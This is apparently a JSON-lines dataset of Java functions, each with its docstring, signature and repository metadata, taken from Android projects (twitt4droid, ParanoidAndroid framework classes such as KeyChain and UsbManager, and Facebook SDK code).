{"docstring": "/**\n * Associates the specified bitmap with the specified key in both memory cache and disk cache.\n * \n * @param context the application context.\n * @param key the key with which the specified value is to be associated\n * @param bitmap the bitmap.\n */\n", "func_signal": "public static void saveInCache(Context context, String key, Bitmap bitmap)", "code": "{\n    if (!Strings.isNullOrBlank(key) && bitmap != null) {\n        MEM_CACHE.put(key, bitmap);\n        saveInDiskCache(context, key, bitmap);\n    }\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Builds a key for given url.\n * \n * @param url an url.\n * @return a key.\n */\n", "func_signal": "private static String buildKey(String url)", "code": "{\n    try {\n        MessageDigest digest = MessageDigest.getInstance(\"SHA-256\");\n        digest.update(url.getBytes());\n        byte[] data = digest.digest();\n        return String.format(\"%0\" + (data.length * 2) + 'x', new BigInteger(1, data));\n    } catch (NoSuchAlgorithmException ex) { \n        Log.e(TAG, \"Couldn't encode url\", ex);\n    }\n    \n    return null;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Initializes some constants. */\n", "func_signal": "private void initConsts()", "code": "{\n    tweetCharLimit = getContext().getResources().getInteger(R.integer.twitt4droid_tweet_char_limit);\n    redColor = getContext().getResources().getColor(R.color.twitt4droid_error_color);\n    defaultCharacterCountTextViewTextColor = charCounterTextView.getTextColors().getDefaultColor();\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Hides the software keyboard. */\n", "func_signal": "private void hideSoftKeyboard()", "code": "{\n    inputMethodManager.hideSoftInputFromWindow(\n            tweetEditText.getWindowToken(),\n            0);\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Pre-appends the given text to the tweet.\n * \n * @param text any text.\n * @return this TweetDialog.\n */\n", "func_signal": "public TweetDialog addTextToTweet(String text)", "code": "{\n    if (!Strings.isNullOrBlank(text)) {\n        tweetEditText.setText(text);\n        onTweetContentChanged(tweetEditText.getText().toString());\n        tweetEditText.setSelection(tweetEditText.getText().length());\n    }\n\n    return this;\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Sets up the authenticated user.\n * \n * @param user the authenticated user.\n */\n", "func_signal": "private void setUpUser(User user)", "code": "{\n    userUsername.setText(getContext().getString(R.string.twitt4droid_username_format, user.getScreenName()));\n    userScreenName.setText(user.getName());\n    new ImageLoader(getContext())\n        .setImageView(userProfileImage)\n        .execute(user.getProfileImageURL());\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** {@inheritDoc} */\n", "func_signal": "@Override\nprotected void onPostExecute(Bitmap result)", "code": "{\n    if (result != null) imageView.setImageBitmap(result);\n    imageView = null;\n    loadingResourceImageId = null;\n    loadingColorId = null;\n    context = null;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Returns the bitmap to which the specified key is mapped, or null if the disk cache contains\n * no mapping for the key.\n * \n * @param context the application context.\n * @param key the key whose associated value is to be returned.\n * @return a bitmap or {@code null}.\n */\n", "func_signal": "private static Bitmap getFromDiskCache(Context context, String key)", "code": "{\n    intDiskCacheIfNeeded(context);\n    DiskLruCache.Snapshot snapshot = null;\n    \n    try {\n        snapshot = DISK_CACHE.get(key);\n    } catch (IOException ex) {\n        Log.e(TAG, \"Couldn't get image from disk cache\", ex);\n    }\n    \n    if (snapshot != null) {\n        BufferedInputStream in = new BufferedInputStream(snapshot.getInputStream(0));\n        Bitmap bitmap = BitmapFactory.decodeStream(in);\n        snapshot.close();\n        return bitmap;\n    }\n    \n    return null;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Finds the custom views. */\n", "func_signal": "private void findViews()", "code": "{\n    userProfileImage = (ImageView) findViewById(R.id.user_profile_image);\n    userUsername = (TextView) findViewById(R.id.user_username);\n    userScreenName = (TextView) findViewById(R.id.user_screen_name);\n    charCounterTextView = (TextView) findViewById(R.id.char_counter_text);\n    tweetEditText = (EditText) findViewById(R.id.tweet_content);\n    tweetButton = (ImageButton) findViewById(R.id.tweet_button);\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Toggles the software keyboard. */\n", "func_signal": "private void toggleSoftKeyboard()", "code": "{\n    inputMethodManager.toggleSoftInput(\n            InputMethodManager.SHOW_FORCED, \n            InputMethodManager.HIDE_IMPLICIT_ONLY);\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Clears both the memory cache and disk cache. */\n", "func_signal": "public static void clearCache()", "code": "{\n    MEM_CACHE.evictAll();\n    if (DISK_CACHE != null) {\n        try {\n            DISK_CACHE.delete();\n        } catch (IOException ex) { \n            Log.e(TAG, \"Couldn't clear disk cache\", ex);\n        }\n    }\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Returns the bitmap to which the specified key is mapped, or null if both the memory cache and\n * disk cache contains no mapping for the key.\n * \n * @param context the application context.\n * @param key the key whose associated value is to be returned.\n * @return a bitmap or {@code null}.\n */\n", "func_signal": "public static Bitmap getFromCache(Context context, String key)", "code": "{\n    Bitmap bitmap = MEM_CACHE.get(key);\n    if (bitmap == null) {\n        bitmap = getFromDiskCache(context, key);\n        if (bitmap != null) MEM_CACHE.put(key, bitmap);\n    }\n    return bitmap;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Sets the drawable resource to use when the ImageView is loading.\n * \n * @param loadingResourceImageId an ImageView.\n * @return this ImageLoader.\n */\n", "func_signal": "public ImageLoader setLoadingResourceImageId(int loadingResourceImageId)", "code": "{\n    this.loadingResourceImageId = loadingResourceImageId;\n    return this;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Initializes components. */\n", "func_signal": "private void init()", "code": "{\n    if (!Twitt4droid.isUserLoggedIn(getContext())) throw new IllegalStateException(\"User must be logged in in order to use TweetDialog\");\n    twitter = Twitt4droid.getAsyncTwitter(getContext());\n    twitter.addListener(new TwitterAdapter() {\n        @Override\n        public void gotUserDetail(final User user) {\n            ((Activity) getContext()).runOnUiThread(new Runnable() {\n                \n                @Override\n                public void run() {\n                    setUpUser(user);\n                }\n            });\n        }\n\n        @Override\n        public void updatedStatus(Status status) {\n            ((Activity) getContext()).runOnUiThread(new Runnable() {\n\n                @Override\n                public void run() {\n                    Toast.makeText(getContext().getApplicationContext(), \n                            R.string.twitt4droid_tweet_sent, \n                            Toast.LENGTH_SHORT)\n                            .show();\n                }\n            });\n        }\n        \n        @Override\n        public void onException(TwitterException te, TwitterMethod method) {\n            Log.e(TAG, \"Twitter error in \" + method, te);\n            ((Activity) getContext()).runOnUiThread(new Runnable() {\n                \n                @Override\n                public void run() {\n                    Toast.makeText(getContext().getApplicationContext(),\n                            R.string.twitt4droid_error_message,\n                            Toast.LENGTH_LONG).show();\n                }\n            });\n        }\n    });\n    requestWindowFeature(Window.FEATURE_NO_TITLE);\n    setContentView(R.layout.twitt4droid_new_tweet);\n    inputMethodManager = (InputMethodManager) getContext().getSystemService(Context.INPUT_METHOD_SERVICE);\n    findViews();\n    initConsts();\n    setUpTweetEditText();\n    setUpTweetButton();\n    setUpUser(Twitt4droid.getCurrentUser(getContext()));\n    if (Resources.isConnectedToInternet(getContext())) twitter.showUser(Twitt4droid.getCurrentUser(getContext()).getScreenName());\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Launches an {@code Activity} for the user to select the alias\n * for a private key and certificate pair for authentication. The\n * selected alias or null will be returned via the\n * KeyChainAliasCallback callback.\n *\n * <p>{@code keyTypes} and {@code issuers} may be used to\n * highlight suggested choices to the user, although to cope with\n * sometimes erroneous values provided by servers, the user may be\n * able to override these suggestions.\n *\n * <p>{@code host} and {@code port} may be used to give the user\n * more context about the server requesting the credentials.\n *\n * <p>{@code alias} allows the chooser to preselect an existing\n * alias which will still be subject to user confirmation.\n *\n * @param activity The {@link Activity} context to use for\n *     launching the new sub-Activity to prompt the user to select\n *     a private key; used only to call startActivity(); must not\n *     be null.\n * @param response Callback to invoke when the request completes;\n *     must not be null\n * @param keyTypes The acceptable types of asymmetric keys such as\n *     \"RSA\" or \"DSA\", or a null array.\n * @param issuers The acceptable certificate issuers for the\n *     certificate matching the private key, or null.\n * @param host The host name of the server requesting the\n *     certificate, or null if unavailable.\n * @param port The port number of the server requesting the\n *     certificate, or -1 if unavailable.\n * @param alias The alias to preselect if available, or null if\n *     unavailable.\n */\n", "func_signal": "public static void choosePrivateKeyAlias(Activity activity, KeyChainAliasCallback response,\n                                         String[] keyTypes, Principal[] issuers,\n                                         String host, int port,\n                                         String alias)", "code": "{\n    /*\n     * TODO currently keyTypes, issuers are unused. They are meant\n     * to follow the semantics and purpose of X509KeyManager\n     * method arguments.\n     *\n     * keyTypes would allow the list to be filtered and typically\n     * will be set correctly by the server. In practice today,\n     * most all users will want only RSA, rarely DSA, and usually\n     * only a small number of certs will be available.\n     *\n     * issuers is typically not useful. Some servers historically\n     * will send the entire list of public CAs known to the\n     * server. Others will send none. If this is used, if there\n     * are no matches after applying the constraint, it should be\n     * ignored.\n     */\n    if (activity == null) {\n        throw new NullPointerException(\"activity == null\");\n    }\n    if (response == null) {\n        throw new NullPointerException(\"response == null\");\n    }\n    Intent intent = new Intent(ACTION_CHOOSER);\n    intent.putExtra(EXTRA_RESPONSE, new AliasResponse(response));\n    intent.putExtra(EXTRA_HOST, host);\n    intent.putExtra(EXTRA_PORT, port);\n    intent.putExtra(EXTRA_ALIAS, alias);\n    // the PendingIntent is used to get calling package name\n    intent.putExtra(EXTRA_SENDER, PendingIntent.getActivity(activity, 0, new Intent(), 0));\n    activity.startActivity(intent);\n}", "path": "keystore\\java\\android\\security\\KeyChain.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Append the given selection clause to the internal state. Each clause is\n * surrounded with parenthesis and combined using {@code AND}.\n */\n", "func_signal": "public SelectionBuilder append(String selection, Object... selectionArgs)", "code": "{\n    if (TextUtils.isEmpty(selection)) {\n        if (selectionArgs != null && selectionArgs.length > 0) {\n            throw new IllegalArgumentException(\n                    \"Valid selection required when including arguments\");\n        }\n\n        // Shortcut when clause is empty\n        return this;\n    }\n\n    if (mSelection.length() > 0) {\n        mSelection.append(\" AND \");\n    }\n\n    mSelection.append(\"(\").append(selection).append(\")\");\n    if (selectionArgs != null) {\n        for (Object arg : selectionArgs) {\n            // TODO: switch to storing direct Object instances once\n            // http://b/2464440 is fixed\n            mSelectionArgs.add(String.valueOf(arg));\n        }\n    }\n\n    return this;\n}", "path": "core\\java\\com\\android\\internal\\content\\SelectionBuilder.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Returns a list of currently attached USB accessories.\n * (in the current implementation there can be at most one)\n *\n * @return list of USB accessories, or null if none are attached.\n */\n", "func_signal": "public UsbAccessory[] getAccessoryList()", "code": "{\n    try {\n        android.hardware.usb.UsbAccessory accessory = mService.getCurrentAccessory();\n        if (accessory == null) {\n            return null;\n        } else {\n            return new UsbAccessory[] { new UsbAccessory(accessory) };\n        }\n    } catch (RemoteException e) {\n        Log.e(TAG, \"RemoteException in getAccessoryList\" , e);\n        return null;\n    }\n}", "path": "libs\\usb\\src\\com\\android\\future\\usb\\UsbManager.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Creates the message handler. Must be called on the WebKit thread.\n * @hide\n */\n", "func_signal": "public synchronized void createHandler()", "code": "{\n    if (mHandler == null) {\n        mHandler = new Handler() {\n            @Override\n            public void handleMessage(Message msg) {\n                // Runs on the WebKit thread.\n                switch (msg.what) {\n                    case GET_ORIGINS: {\n                        Set origins = nativeGetOrigins();\n                        ValueCallback callback = (ValueCallback) msg.obj;\n                        Map values = new HashMap<String, Object>();\n                        values.put(CALLBACK, callback);\n                        values.put(ORIGINS, origins);\n                        postUIMessage(Message.obtain(null, RETURN_ORIGINS, values));\n                        } break;\n                    case GET_ALLOWED: {\n                        Map values = (Map) msg.obj;\n                        String origin = (String) values.get(ORIGIN);\n                        ValueCallback callback = (ValueCallback) values.get(CALLBACK);\n                        boolean allowed = nativeGetAllowed(origin);\n                        Map retValues = new HashMap<String, Object>();\n                        retValues.put(CALLBACK, callback);\n                        retValues.put(ALLOWED, Boolean.valueOf(allowed));\n                        postUIMessage(Message.obtain(null, RETURN_ALLOWED, retValues));\n                        } break;\n                    case CLEAR:\n                        nativeClear((String) msg.obj);\n                        break;\n                    case ALLOW:\n                        nativeAllow((String) msg.obj);\n                        break;\n                    case CLEAR_ALL:\n                        nativeClearAll();\n                        break;\n                }\n            }\n        };\n\n        // Handle the queued messages\n        if (mQueuedMessages != null) {\n            while (!mQueuedMessages.isEmpty()) {\n                mHandler.sendMessage(mQueuedMessages.remove(0));\n            }\n            mQueuedMessages = null;\n        }\n    }\n}", "path": "core\\java\\android\\webkit\\GeolocationPermissionsClassic.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Returns {@code true} if the current device's {@code KeyChain} binds any\n * {@code PrivateKey} of the given {@code algorithm} to the device once\n * imported or generated. This can be used to tell if there is special\n * hardware support that can be used to bind keys to the device in a way\n * that makes it non-exportable.\n */\n", "func_signal": "public static boolean isBoundKeyAlgorithm(String algorithm)", "code": "{\n    if (!isKeyAlgorithmSupported(algorithm)) {\n        return false;\n    }\n\n    return KeyStore.getInstance().isHardwareBacked();\n}", "path": "keystore\\java\\android\\security\\KeyChain.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Reset any internal state, allowing this builder to be recycled.\n */\n", "func_signal": "public SelectionBuilder reset()", "code": "{\n    mSelection.setLength(0);\n    mSelectionArgs.clear();\n    return this;\n}", "path": "core\\java\\com\\android\\internal\\content\\SelectionBuilder.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Requests temporary permission for the given package to access the accessory.\n * This may result in a system dialog being displayed to the user\n * if permission had not already been granted.\n * Success or failure is returned via the {@link android.app.PendingIntent} pi.\n * The boolean extra {@link #EXTRA_PERMISSION_GRANTED} will be attached to the\n * PendingIntent to indicate success or failure.\n * If successful, this grants the caller permission to access the device only\n * until the device is disconnected.\n *\n * @param accessory to request permissions for\n * @param pi PendingIntent for returning result\n */\n", "func_signal": "public void requestPermission(UsbAccessory accessory, PendingIntent pi)", "code": "{\n    try {\n        mService.requestAccessoryPermission(new android.hardware.usb.UsbAccessory(\n                accessory.getManufacturer(),accessory.getModel(),\n                accessory.getDescription(), accessory.getVersion(),\n                accessory.getUri(), accessory.getSerial()),\n                mContext.getPackageName(), pi);\n    } catch (RemoteException e) {\n        Log.e(TAG, \"RemoteException in requestPermission\", e);\n    }\n}", "path": "libs\\usb\\src\\com\\android\\future\\usb\\UsbManager.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Creates the UI message handler. Must be called on the UI thread.\n * @hide\n */\n", "func_signal": "public void createUIHandler()", "code": "{\n    if (mUIHandler == null) {\n        mUIHandler = new Handler() {\n            @Override\n            public void handleMessage(Message msg) {\n                // Runs on the UI thread.\n                switch (msg.what) {\n                    case RETURN_ORIGINS: {\n                        Map values = (Map) msg.obj;\n                        Set<String> origins = (Set<String>) values.get(ORIGINS);\n                        ValueCallback<Set<String> > callback = (ValueCallback<Set<String> >) values.get(CALLBACK);\n                        callback.onReceiveValue(origins);\n                    } break;\n                    case RETURN_ALLOWED: {\n                        Map values = (Map) msg.obj;\n                        Boolean allowed = (Boolean) values.get(ALLOWED);\n                        ValueCallback<Boolean> callback = (ValueCallback<Boolean>) values.get(CALLBACK);\n                        callback.onReceiveValue(allowed);\n                    } break;\n                }\n            }\n        };\n    }\n}", "path": "core\\java\\android\\webkit\\GeolocationPermissionsClassic.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Utility function to send a message to the handler on the UI thread\n */\n", "func_signal": "private void postUIMessage(Message msg)", "code": "{\n    if (mUIHandler != null) {\n        mUIHandler.sendMessage(msg);\n    }\n}", "path": "core\\java\\android\\webkit\\GeolocationPermissionsClassic.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Execute query using the current internal state as {@code WHERE} clause.\n */\n", "func_signal": "public Cursor query(SQLiteDatabase db, String table, String[] columns, String groupBy,\n        String having, String orderBy, String limit)", "code": "{\n    return db.query(table, columns, getSelection(), getSelectionArgs(), groupBy, having,\n            orderBy, limit);\n}", "path": "core\\java\\com\\android\\internal\\content\\SelectionBuilder.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Returns the {@code X509Certificate} chain for the requested\n * alias, or null if no there is no result.\n *\n * @param alias The alias of the desired certificate chain, typically\n * returned via {@link KeyChainAliasCallback#alias}.\n * @throws KeyChainException if the alias was valid but there was some problem accessing it.\n */\n", "func_signal": "public static X509Certificate[] getCertificateChain(Context context, String alias)\n        throws KeyChainException, InterruptedException", "code": "{\n    if (alias == null) {\n        throw new NullPointerException(\"alias == null\");\n    }\n    KeyChainConnection keyChainConnection = bind(context);\n    try {\n        IKeyChainService keyChainService = keyChainConnection.getService();\n\n        final byte[] certificateBytes = keyChainService.getCertificate(alias);\n        if (certificateBytes == null) {\n            return null;\n        }\n\n        TrustedCertificateStore store = new TrustedCertificateStore();\n        List<X509Certificate> chain = store\n                .getCertificateChain(toCertificate(certificateBytes));\n        return chain.toArray(new X509Certificate[chain.size()]);\n    } catch (RemoteException e) {\n        throw new KeyChainException(e);\n    } catch (RuntimeException e) {\n        // only certain RuntimeExceptions can be propagated across the IKeyChainService call\n        throw new KeyChainException(e);\n    } finally {\n        keyChainConnection.close();\n    }\n}", "path": "keystore\\java\\android\\security\\KeyChain.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Returns true if the caller has permission to access the accessory.\n * Permission might have been granted temporarily via\n * {@link #requestPermission} or\n * by the user choosing the caller as the default application for the accessory.\n *\n * @param accessory to check permissions for\n * @return true if caller has permission\n */\n", "func_signal": "public boolean hasPermission(UsbAccessory accessory)", "code": "{\n    try {\n        return mService.hasAccessoryPermission(new android.hardware.usb.UsbAccessory(\n                accessory.getManufacturer(),accessory.getModel(),\n                accessory.getDescription(), accessory.getVersion(),\n                accessory.getUri(), accessory.getSerial()));\n    } catch (RemoteException e) {\n        Log.e(TAG, \"RemoteException in hasPermission\", e);\n        return false;\n    }\n}", "path": "libs\\usb\\src\\com\\android\\future\\usb\\UsbManager.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Utility function to send a message to our handler.\n */\n", "func_signal": "private synchronized void postMessage(Message msg)", "code": "{\n    if (mHandler == null) {\n        if (mQueuedMessages == null) {\n            mQueuedMessages = new Vector<Message>();\n        }\n        mQueuedMessages.add(msg);\n    } else {\n        mHandler.sendMessage(msg);\n    }\n}", "path": "core\\java\\android\\webkit\\GeolocationPermissionsClassic.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * @hide for reuse by CertInstaller and Settings.\n *\n * Caller should call unbindService on the result when finished.\n */\n", "func_signal": "public static KeyChainConnection bind(Context context) throws InterruptedException", "code": "{\n    if (context == null) {\n        throw new NullPointerException(\"context == null\");\n    }\n    ensureNotOnMainThread(context);\n    final BlockingQueue<IKeyChainService> q = new LinkedBlockingQueue<IKeyChainService>(1);\n    ServiceConnection keyChainServiceConnection = new ServiceConnection() {\n        volatile boolean mConnectedAtLeastOnce = false;\n        @Override public void onServiceConnected(ComponentName name, IBinder service) {\n            if (!mConnectedAtLeastOnce) {\n                mConnectedAtLeastOnce = true;\n                try {\n                    q.put(IKeyChainService.Stub.asInterface(service));\n                } catch (InterruptedException e) {\n                    // will never happen, since the queue starts with one available slot\n                }\n            }\n        }\n        @Override public void onServiceDisconnected(ComponentName name) {}\n    };\n    boolean isBound = context.bindService(new Intent(IKeyChainService.class.getName()),\n                                          keyChainServiceConnection,\n                                          Context.BIND_AUTO_CREATE);\n    if (!isBound) {\n        throw new AssertionError(\"could not bind to KeyChainService\");\n    }\n    return new KeyChainConnection(context, keyChainServiceConnection, q.take());\n}", "path": "keystore\\java\\android\\security\\KeyChain.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * @param offset The offset in the edited text where the old and new text start.\n * @param oldText The old text that has been replaced.\n * @param newText The replacement text.\n */\n", "func_signal": "public CorrectionInfo(int offset, CharSequence oldText, CharSequence newText)", "code": "{\n    mOffset = offset;\n    mOldText = oldText;\n    mNewText = newText;\n}", "path": "core\\java\\android\\view\\inputmethod\\CorrectionInfo.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "// Note that we represent the origins as strings. These are created using\n// WebCore::SecurityOrigin::toString(). As long as all 'HTML 5 modules'\n// (Database, Geolocation etc) do so, it's safe to match up origins based\n// on this string.\n", "func_signal": "@Override\npublic void getOrigins(ValueCallback<Set<String> > callback)", "code": "{\n    if (callback != null) {\n        if (WebViewCore.THREAD_NAME.equals(Thread.currentThread().getName())) {\n            Set origins = nativeGetOrigins();\n            callback.onReceiveValue(origins);\n        } else {\n            postMessage(Message.obtain(null, GET_ORIGINS, callback));\n        }\n    }\n}", "path": "core\\java\\android\\webkit\\GeolocationPermissionsClassic.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Opens a file descriptor for reading and writing data to the USB accessory.\n *\n * @param accessory the USB accessory to open\n * @return file descriptor, or null if the accessor could not be opened.\n */\n", "func_signal": "public ParcelFileDescriptor openAccessory(UsbAccessory accessory)", "code": "{\n    try {\n        return mService.openAccessory(new android.hardware.usb.UsbAccessory(\n                accessory.getManufacturer(),accessory.getModel(),\n                accessory.getDescription(), accessory.getVersion(),\n                accessory.getUri(), accessory.getSerial()));\n    } catch (RemoteException e) {\n        Log.e(TAG, \"RemoteException in openAccessory\" , e);\n        return null;\n    }\n}", "path": "libs\\usb\\src\\com\\android\\future\\usb\\UsbManager.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Returns an {@code Intent} that can be used for credential\n * installation. The intent may be used without any extras, in\n * which case the user will be able to install credentials from\n * their own source.\n *\n * <p>Alternatively, {@link #EXTRA_CERTIFICATE} or {@link\n * #EXTRA_PKCS12} maybe used to specify the bytes of an X.509\n * certificate or a PKCS#12 key store for installation. These\n * extras may be combined with {@link #EXTRA_NAME} to provide a\n * default alias name for credentials being installed.\n *\n * <p>When used with {@link Activity#startActivityForResult},\n * {@link Activity#RESULT_OK} will be returned if a credential was\n * successfully installed, otherwise {@link\n * Activity#RESULT_CANCELED} will be returned.\n */\n", "func_signal": "public static Intent createInstallIntent()", "code": "{\n    Intent intent = new Intent(ACTION_INSTALL);\n    intent.setClassName(\"com.android.certinstaller\",\n                        \"com.android.certinstaller.CertInstallerMain\");\n    return intent;\n}", "path": "keystore\\java\\android\\security\\KeyChain.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * @param in underlying stream to wrap\n * @param offset offset into stream where data starts\n * @param length length of data at offset\n * @throws IOException if an error occurred with the underlying stream\n */\n", "func_signal": "public LimitedLengthInputStream(InputStream in, long offset, long length) throws IOException", "code": "{\n    super(in);\n\n    if (in == null) {\n        throw new IOException(\"in == null\");\n    }\n\n    if (offset < 0) {\n        throw new IOException(\"offset < 0\");\n    }\n\n    if (length < 0) {\n        throw new IOException(\"length < 0\");\n    }\n\n    if (length > Long.MAX_VALUE - offset) {\n        throw new IOException(\"offset + length > Long.MAX_VALUE\");\n    }\n\n    mEnd = offset + length;\n\n    skip(offset);\n    mOffset = offset;\n}", "path": "core\\java\\android\\content\\pm\\LimitedLengthInputStream.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Used to package this object into a {@link Parcel}.\n *\n * @param dest The {@link Parcel} to be written.\n * @param flags The flags used for parceling.\n */\n", "func_signal": "public void writeToParcel(Parcel dest, int flags)", "code": "{\n    dest.writeInt(mOffset);\n    TextUtils.writeToParcel(mOldText, dest, flags);\n    TextUtils.writeToParcel(mNewText, dest, flags);\n}", "path": "core\\java\\android\\view\\inputmethod\\CorrectionInfo.java", "repo_name": "ParanoidAndroid/android_frameworks_base", "stars": 85, "license": "other", "language": "java", "size": 1499564}
{"docstring": "/**\n * Constructor\n *\n * @param context Context for this View\n * @param attrs   AttributeSet for this View.\n */\n", "func_signal": "public LikeView(Context context, AttributeSet attrs)", "code": "{\n    super(context, attrs);\n    parseAttributes(attrs);\n    initialize(context);\n}", "path": "libs\\facebook\\src\\com\\facebook\\widget\\LikeView.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Called from UiLifecycleHelper to process any pending likes that had resulted in the Like dialog\n * being displayed\n *\n * @param context Hosting context\n * @param requestCode From the originating call to onActivityResult\n * @param resultCode From the originating call to onActivityResult\n * @param data From the originating call to onActivityResult\n * @return Indication of whether the Intent was handled\n */\n", "func_signal": "public static boolean handleOnActivityResult(Context context,\n                                             final int requestCode,\n                                             final int resultCode,\n                                             final Intent data)", "code": "{\n    final UUID callId = NativeProtocol.getCallIdFromIntent(data);\n    if (callId == null) {\n        return false;\n    }\n\n    // See if we were waiting on a Like dialog completion.\n    if (Utility.isNullOrEmpty(objectIdForPendingController)) {\n        SharedPreferences sharedPreferences = context.getSharedPreferences(\n                LIKE_ACTION_CONTROLLER_STORE,\n                Context.MODE_PRIVATE);\n\n        objectIdForPendingController = sharedPreferences.getString(\n                LIKE_ACTION_CONTROLLER_STORE_PENDING_OBJECT_ID_KEY,\n                null);\n    }\n\n    if (Utility.isNullOrEmpty(objectIdForPendingController)) {\n        // Doesn't look like we were waiting on a Like dialog completion\n        return false;\n    }\n\n    getControllerForObjectId(\n            context,\n            objectIdForPendingController,\n            new CreationCallback() {\n                @Override\n                public void onComplete(LikeActionController likeActionController) {\n                    likeActionController.onActivityResult(requestCode, resultCode, data, callId);\n                }\n            });\n\n    return true;\n}", "path": "libs\\facebook\\src\\com\\facebook\\internal\\LikeActionController.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
{"docstring": "/**\n * Sets the timeout to wait for responses from the server before a timeout error occurs.\n * @param timeoutInMilliseconds the timeout, in milliseconds; 0 means do not timeout\n */\n", "func_signal": "public void setTimeout(int timeoutInMilliseconds)", "code": "{\n    if (timeoutInMilliseconds < 0) {\n        throw new IllegalArgumentException(\"Argument timeoutInMilliseconds must be >= 0.\");\n    }\n    this.timeoutInMilliseconds = timeoutInMilliseconds;\n}", "path": "libs\\facebook\\src\\com\\facebook\\RequestBatch.java", "repo_name": "frogermcs/HelloMultidex", "stars": 70, "license": "None", "language": "java", "size": 1562}
